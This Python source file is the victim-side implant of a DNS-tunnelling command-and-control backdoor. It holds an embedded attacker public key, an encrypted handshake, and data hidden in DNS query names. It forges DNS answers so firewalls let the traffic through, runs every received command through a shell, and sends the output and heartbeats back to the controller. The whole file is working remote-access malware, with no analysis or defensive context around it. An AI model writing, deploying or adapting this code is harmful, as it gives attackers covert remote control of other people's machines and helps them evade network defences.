import socket, time, random, subprocess, gc, threading, sys, zlib, struct
from collections import deque
from Crypto.PublicKey import ECC
from dnslib import DNSRecord
from check_missing import check_missing_packets
from build_dns_message import dns_message
from encryption import encrypt_symmetric, handshake_initiate
from decryption import decrypt_symmetric, handshake_verify
from message_fragmentation import verify_and_unpack
from fake_dns_response import build_fake_response
import cvc_codec

ATTACKER_STATIC_PUBKEY_STR = """-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEUnWlQdwMyM3H+bJdfJGRGAY/pfkD
byS6+yVLuZj8YtvOsRb6mQyXBUUdvckfTDh5jdudZT9pMGJgWMhNPXlQ+w==
-----END PUBLIC KEY-----"""

target_pub_key = None
CHUNK_SIZE = 13
SERVER = ("127.0.0.1", 27381)
sent_chunks = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
last_received_time = None
received_chunks = {}
expected_chunks = None
CURRENT_SESSION_KEY = None
resends_requests = 0
victim_eph_privkey = None
_SEEN_SESSIONS = deque(maxlen=512)

try:
    target_pub_key = ECC.import_key(ATTACKER_STATIC_PUBKEY_STR)
except Exception:
    sys.exit(1)


def send_raw(payload):
    try:
        for chunk in dns_message(payload, CHUNK_SIZE):
            sock.sendto(chunk, SERVER)
    except Exception:
        pass


def send_msg(message, is_cached):
    global CURRENT_SESSION_KEY, sent_chunks
    if isinstance(message, str):
        message = message.encode('utf-8')
    try:
        if not CURRENT_SESSION_KEY:
            return
        result = encrypt_symmetric(message, CURRENT_SESSION_KEY)
        if not result.get("success"):
            return
        chunks = dns_message(result["message"], CHUNK_SIZE)
        sent_chunks = {}
        for i, chunk in enumerate(chunks):
            if is_cached:
                sent_chunks[i] = chunk
                time.sleep(0.002 + random.uniform(-0.002, 0.002))
            sock.sendto(chunk, SERVER)
    except Exception:
        return


def timeout_checker():
    global received_chunks, expected_chunks, last_received_time, resends_requests
    while True:
        try:
            if last_received_time is not None:
                if resends_requests < 3:
                    try:
                        if received_chunks:
                            sid = next(iter(received_chunks))
                            buf = received_chunks[sid]["chunks"]
                            expected_chunks = received_chunks[sid]["total"]
                            if expected_chunks and buf and (time.time() - last_received_time) > 3:
                                missing = check_missing_packets(buf, expected_chunks)
                                if missing:
                                    send_msg(f"RESEND:{','.join(str(i) for i in missing)}", False)
                                    resends_requests += 1
                                    time.sleep(5)
                                    continue
                    except Exception:
                        pass
                else:
                    resends_requests = 0
                    last_received_time = None
                    received_chunks = {}
                    expected_chunks = None
            time.sleep(0.5)
        except Exception:
            pass
        time.sleep(0.5)


def core():
    global received_chunks, expected_chunks, sent_chunks, last_received_time
    global CURRENT_SESSION_KEY, resends_requests, victim_eph_privkey

    hs = handshake_initiate()
    if hs and hs.get("success"):
        victim_eph_privkey = hs.get("eph_priv_key")
        send_raw(hs.get("message"))

    sock.settimeout(60)

    while True:
        try:
            data, addr = sock.recvfrom(4096)
            if len(data) < 20:
                continue

            try:
                dns_request = DNSRecord.parse(data)
            except Exception:
                continue

            # Send fake DNS response to satisfy firewalls
            if dns_request.header.qr == 0:
                try:
                    sock.sendto(build_fake_response(dns_request), addr)
                except Exception:
                    pass
            else:
                continue

            query_name = str(dns_request.q.qname).rstrip('.')
            raw_packet_bytes = cvc_codec.decode_domain_to_bytes(query_name)
            if not raw_packet_bytes or len(raw_packet_bytes) < 6:
                continue

            session_id = dns_request.header.id
            if session_id in _SEEN_SESSIONS and session_id not in received_chunks:
                continue

            result = verify_and_unpack(raw_packet_bytes)
            if result is None:
                continue
            index, total, chunk_data = result

            last_received_time = time.time()

            if session_id not in received_chunks:
                received_chunks[session_id] = {"total": total, "chunks": {}}

            buffer = received_chunks[session_id]
            if index in buffer["chunks"]:
                continue
            buffer["chunks"][index] = chunk_data

            if len(buffer["chunks"]) == buffer["total"]:
                full_payload = b"".join(buffer["chunks"][i] for i in sorted(buffer["chunks"]))
                _SEEN_SESSIONS.append(session_id)
                received_chunks.pop(session_id, None)

                # Try handshake first
                try:
                    hs_verify = handshake_verify(full_payload, victim_eph_privkey, target_pub_key)
                    if hs_verify and hs_verify.get("success"):
                        CURRENT_SESSION_KEY = hs_verify.get("master_key")
                        victim_eph_privkey = None
                        expected_chunks = None
                        resends_requests = 0
                        gc.collect()
                        continue
                except Exception:
                    pass

                # Try AES decryption
                if CURRENT_SESSION_KEY:
                    dec = decrypt_symmetric(full_payload, CURRENT_SESSION_KEY)
                    if dec and dec.get("success"):
                        plaintext = dec["message"]
                        try:
                            if plaintext == b"ACK":
                                full_command = "ACK"
                            elif plaintext.startswith(b"RESEND:"):
                                full_command = plaintext.decode('utf-8')
                            else:
                                try:
                                    full_command = zlib.decompress(plaintext).decode('utf-8')
                                except zlib.error:
                                    full_command = plaintext.decode('utf-8')
                        except Exception:
                            full_command = plaintext.decode('utf-8', errors='ignore')

                        if full_command == "ACK":
                            sent_chunks = {}
                            last_received_time = None
                        elif full_command.startswith("RESEND:"):
                            for idx in full_command.replace("RESEND:", "").split(","):
                                try:
                                    idx = int(idx)
                                    if idx in sent_chunks:
                                        sock.sendto(sent_chunks[idx], SERVER)
                                        time.sleep(0.05)
                                except Exception:
                                    pass
                        else:
                            try:
                                result = subprocess.run(
                                    full_command, shell=True,
                                    capture_output=True, timeout=60
                                )
                                output = result.stdout + result.stderr
                                response = output.decode('utf-8', errors='replace')
                            except subprocess.TimeoutExpired:
                                response = "Command timed out after 60 seconds"
                            except Exception as e:
                                response = str(e)

                            if not response:
                                response = " "
                            send_msg(zlib.compress(response.encode('utf-8')), True)
                else:
                    received_chunks.pop(session_id, None)
                    expected_chunks = None
                    resends_requests = 0
                    gc.collect()
                    continue

        except socket.timeout:
            if not CURRENT_SESSION_KEY:
                hs = handshake_initiate()
                if hs and hs.get("success"):
                    victim_eph_privkey = hs.get("eph_priv_key")
                    send_raw(hs.get("message"))
            else:
                send_msg(zlib.compress(b"heartbeat"), False)
            continue
        except Exception:
            pass


threads = [
    threading.Thread(target=core),
    threading.Thread(target=timeout_checker),
]
for t in threads:
    t.start()